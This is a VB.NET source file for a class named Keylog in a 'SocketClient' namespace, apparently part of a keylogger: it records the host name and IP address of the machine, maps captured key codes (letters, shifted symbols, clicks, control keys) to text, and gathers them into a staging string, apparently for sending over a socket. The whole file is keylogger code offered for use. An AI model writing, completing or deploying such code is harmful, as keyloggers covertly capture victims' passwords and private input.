
Imports System.Net

Namespace SocketClient
    Public Class Keylog
        Public Function GetComputerInfo() As String
            Dim ComputerName As String, ipAddress As String
            ComputerName = Dns.GetHostName
            ipAddress = Dns.GetHostByName(ComputerName).AddressList(0).ToString().Replace(".", "_")
            GetComputerInfo = ComputerName & "__" & ipAddress
        End Function
        ' writes buffer to output box
        Public Sub BufferToOutput(ByVal buffer As List(Of String), ByRef stagingpoint As String)
            Dim buffercat As String
            buffercat = String.Empty
            If buffer.Count <> 0 Then
                Dim qux As Integer = 0
                While qux < buffer.Count
                    buffercat = buffercat & buffer(qux)
                    qux += 1
                End While
                stagingpoint = stagingpoint & buffercat
                buffercat = String.Empty
            End If
        End Sub
        ' parses keycode and saves to buffer to be written
        Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean, actual As String, ByRef buffer As List(Of String))
            If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
                Exit Sub
            End If
            Select Case foo
                Case 48 To 57
                    If modifier Then
                        Select Case foo
                            Case 48
                                actual = ")"
                            Case 49
                                actual = "!"
                            Case 50
                                actual = "@"
                            Case 51
                                actual = "#"
                            Case 52
                                actual = "$"
                            Case 53
                                actual = "%"
                            Case 54
                                actual = "^"
                            Case 55
                                actual = "&"
                            Case 56
                                actual = "*"
                            Case 57
                                actual = "("
                        End Select
                    Else
                        actual = Convert.ToChar(foo)
                    End If
                Case 65 To 90
                    If modifier Then
                        actual = Convert.ToChar(foo)
                    Else
                        actual = Convert.ToChar(foo + 32)
                    End If
                Case 1
                    actual = "<LCLICK>"
                Case 2
                    actual = "<RCLICK>"
                Case 8
                    actual = "<BACKSPACE>"
                Case 9
                    actual = "<TAB>"
                Case 13
                    actual = "<ENTER>"
                Case 17
                    actual = "<CTRL>"
                Case 18
                    actual = "<ALT>"
                Case 19
                    actual = "<PAUSE>"
                Case 20
                    actual = "<CAPSLOCK>"
                Case 27
                    actual = "<ESC>"
                Case 32
                    actual = " "
                Case 33
                    actual = "<PAGEUP>"
                Case 34
                    actual = "<PAGEDOWN>"
                Case 35
                    actual = "<END>"
                Case 36
                    actual = "<HOME>"
                Case 37
                    actual = "<LEFT>"
                Case 38
                    actual = "<UP>"
                Case 39
                    actual = "<RIGHT>"
                Case 40
                    actual = "<DOWN>"
                Case 44
                    actual = "<PRNTSCRN>"
                Case 45
                    actual = "<INSERT>"
                Case 46
                    actual = "<DEL>"
                Case 47
                    actual = "<HELP>"
                Case 186
                    If modifier Then
                        actual = ":"
                    Else
                        actual = ";"
                    End If
                Case 187
                    If modifier Then
                        actual = "+"
                    Else
                        actual = "="
                    End If
                Case 188
                    If modifier Then
                        actual = "<"
                    Else
                        actual = ","
                    End If
                Case 189
                    If modifier Then
                        actual = "_"
                    Else
                        actual = "-"
                    End If
                Case 190
                    If modifier Then
                        actual = ">"
                    Else
                        actual = "."
                    End If
                Case 191
                    If modifier Then
                        actual = "?"
                    Else
                        actual = "/"
                    End If
                Case 192
                    If modifier Then
                        actual = "~"
                    Else
                        actual = "`"
                    End If
            End Select
            If buffer.Count <> 0 Then
                Dim bar As Integer = 0
                While bar < buffer.Count
                    If buffer(bar) = actual Then
                        Exit Sub
                    End If
                    bar += 1
                End While
            End If
            buffer.Add(actual)
        End Sub
    End Class
End Namespace

